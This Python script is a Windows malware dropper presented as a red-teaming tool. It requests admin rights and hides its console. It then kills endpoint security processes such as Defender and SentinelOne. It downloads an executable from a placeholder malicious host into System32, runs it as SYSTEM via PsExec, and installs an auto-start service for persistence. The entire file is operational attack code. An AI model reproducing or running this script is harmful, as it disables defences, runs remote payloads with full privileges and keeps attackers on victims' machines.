import os
import sys
import psutil
import ctypes
import zipfile
import requests
import subprocess

PSTOOLS_URL = "https://download.sysinternals.com/files/PSTools.zip"
PSTOOLS_ZIP_PATH = r"C:\Windows\Temp\PSTools.zip"
PSTOOLS_DIR = r"C:\Windows\Temp\PSTools"
PSEXEC_PATH = os.path.join(PSTOOLS_DIR, "PsExec.exe")
EXE_DOWNLOAD_URL = "http://maliciouswebsite.com/my_malware.exe"
EXE_SAVE_PATH = r"C:\Windows\System32\my_malware.exe"
SERVICE_NAME = "MyRedTeamingService"
SERVICE_DISPLAY_NAME = "RedTeamer"
SERVICE_DESCRIPTION = "This service is used for persistence for RedTeamer."

EDR_PROCESSES = [
    "MsMpEng.exe", "SentinelAgent.exe", "CarbonBlack.exe", 
    "QualysAgent.exe", "ElasticAgent.exe", "CylanceSvc.exe"
]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def obtain_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def hide_window():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def download_zip_file(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, 'wb') as file:
            file.write(response.content)

def extract_zip_file(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

def download_executable(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, 'wb') as file:
            file.write(response.content)

def run_executable_with_psexec(exe_path, psexec_path):
    try:
        subprocess.Popen([psexec_path, "-accepteula", "-nobanner", "-s", exe_path], shell=True)
    except:
        pass

def create_persistence_service(exe_path, service_name, display_name, description):
    try:
        subprocess.run([
            "wmic", "service", "create",
            f"name={service_name}",
            f"displayname={display_name}",
            f"description={description}",
            f"startmode=auto",
            f"binpath={exe_path}"
        ], shell=True)
    except:
        pass

def start_persistence_service(service_name):
    try:
        subprocess.run(["net", "start", service_name], shell=True)
    except:
        pass

def block_edr_processes():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] in EDR_PROCESSES:
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

if is_admin():
    hide_window()
    block_edr_processes()
    download_zip_file(PSTOOLS_URL, PSTOOLS_ZIP_PATH)
    extract_zip_file(PSTOOLS_ZIP_PATH, PSTOOLS_DIR)
    download_executable(EXE_DOWNLOAD_URL, EXE_SAVE_PATH)
    run_executable_with_psexec(EXE_SAVE_PATH, PSEXEC_PATH)
    create_persistence_service(EXE_SAVE_PATH, SERVICE_NAME, SERVICE_DISPLAY_NAME, SERVICE_DESCRIPTION)
    start_persistence_service(SERVICE_NAME)
else:
    obtain_admin()
